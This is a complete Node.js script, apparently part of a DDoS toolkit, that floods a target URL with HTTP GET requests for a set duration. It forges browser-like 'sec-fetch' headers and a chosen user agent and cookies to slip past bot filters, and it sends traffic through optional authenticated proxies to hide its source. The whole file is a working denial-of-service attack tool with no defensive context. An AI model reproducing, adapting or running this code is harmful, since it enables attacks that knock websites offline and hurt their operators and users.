// h1.js
const { request } = require('undici');
const { HttpsProxyAgent } = require('https-proxy-agent');

const host = process.argv[2];
const duration = process.argv[3];
const rates = process.argv[4];
const userAgent = process.argv[5];
const cookies = process.argv[6];
const proxyArg = process.argv[7];

async function flood(host, duration, rates, userAgent, cookies, proxyArg) {
  const endTime = Date.now() + duration * 1000;

  let agent = null;
  if (proxyArg && proxyArg !== "raw") {
    const proxy = proxyArg;
    if (proxy.includes(":")) {
      const parts = proxy.split(":");
      if (parts.length === 4) {
        const [ip, port, username, password] = parts;
        const proxyUrl = `http://${username}:${password}@${ip}:${port}`;
        agent = new HttpsProxyAgent(proxyUrl);
      } else if (parts.length === 2) {
        const [ip, port] = parts;
        const proxyUrl = `http://${ip}:${port}`;
        agent = new HttpsProxyAgent(proxyUrl);
      }
    }
  }

  async function sendRequest() {
    try {
      const options = {
        method: 'GET',
        headers: {
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": '"Windows"',
          "sec-fetch-dest": "document",
          "sec-fetch-mode": "navigate",
          "sec-fetch-site": "none",
          "sec-fetch-user": "?1",
          "upgrade-insecure-requests": "1",
          'User-Agent': userAgent,
          Cookie: cookies,
        },
      };
      
      if (agent) {
        options.dispatcher = agent;
      }
      
      const response = await request(host, options);
    } catch (error) {
    }
  }

  for (let i = 0; i < rates; i++) {
    const intervalId = setInterval(() => {
      if (Date.now() >= endTime) {
        clearInterval(intervalId);
      } else {
        sendRequest();
      }
    }, 6);
  }

  console.log(`[INFO] Flood started on ${rates} rates for ${duration} seconds`);
}

flood(host, duration, rates, userAgent, cookies, proxyArg);